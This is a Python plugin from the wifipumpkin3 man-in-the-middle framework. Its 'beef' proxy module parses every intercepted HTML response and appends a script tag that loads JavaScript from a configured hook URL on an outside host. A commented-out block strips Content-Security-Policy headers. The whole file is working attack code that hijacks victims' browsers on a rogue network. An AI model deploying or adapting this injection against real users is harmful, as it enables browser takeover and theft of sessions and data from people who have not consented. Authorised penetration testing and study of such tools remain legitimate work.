from wifipumpkin3.plugins.pumpkinproxy.base import BasePumpkin
from bs4 import BeautifulSoup

# This file is part of the wifipumpkin3 Open Source Project.
# wifipumpkin3 is licensed under the Apache 2.0.

# Copyright 2021 Commaders Team - Marcos Bomfim (mh4x0f)

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


class beef(BasePumpkin):
    meta = {
        "_name": "beef",
        "_version": "1.1",
        "_description": "url injection insert and use our own JavaScript code in a page.",
        "_author": "John Ry",
    }

    @staticmethod
    def getName():
        return beef.meta["_name"]

    def __init__(self):
        for key, value in self.meta.items():
            self.__dict__[key] = value
        self.ConfigParser = True
        self.urlhook = self.config.get("set_beef", "url_hook")

    def handleResponse(self, request, data):

        html = BeautifulSoup(data, "html.parser")
        """
        # To Allow CORS
        if "Content-Security-Policy" in flow.response.headers:
            del flow.response.headers["Content-Security-Policy"]
        """
        if html.body:
            url = "{}".format(request.uri)
            metatag = html.new_tag("script")
            metatag.attrs["src"] = self.urlhook
            metatag.attrs["type"] = "text/javascript"
            html.body.append(metatag)
            data = str(html)
            print("[{} js script Injected in [ {} ]".format(self._name, url))
        return data